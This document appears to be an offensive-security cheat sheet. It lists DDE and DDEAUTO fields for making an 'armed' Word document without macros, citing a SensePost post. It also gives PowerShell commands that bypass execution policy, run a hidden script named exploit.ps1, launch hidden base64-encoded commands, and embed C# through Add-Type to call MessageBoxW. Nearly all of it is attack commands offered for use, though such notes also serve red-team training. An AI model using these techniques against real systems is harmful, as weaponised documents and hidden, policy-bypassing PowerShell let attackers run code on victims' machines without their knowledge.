## MSWord-Code-Exec
Leverage Dynamic Data Exchange (DDE) through the following payloads to create an armed MS Word Document
without utilizing any macros (https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/) 
* DDEAUTO
* DDE
## Bypass PowerShell Execution Policy
> Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
## Instantiate PowerShell.exe with no execution policy to run a script of choice
> powershell.exe -executionpolicy bypass -windowstyle hidden -noninteractive -nologo -file "c:\temp\exploit.ps1"
## Encoded PowerShell Command
> powershell.exe –WindowStyle Hidden –noprofile –EncodedCommand <BASE64ENCODED>
## Embedding C# into PowerShell
> Add-Type -TypeDefinition @"
        using System;
        using System.Diagnostics;
        using System.Runtime.InteropServices;
  
        public static class User32
        {
              [DllImport("User32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
              public static extern int MessageBoxW(
                              int hWnd,
                              string lpText,
                              string lpCaption,
                              int uType
              );
        }
  "@
  [User32]::MessageBoxW(0, "SensePost", 0x00000000L)
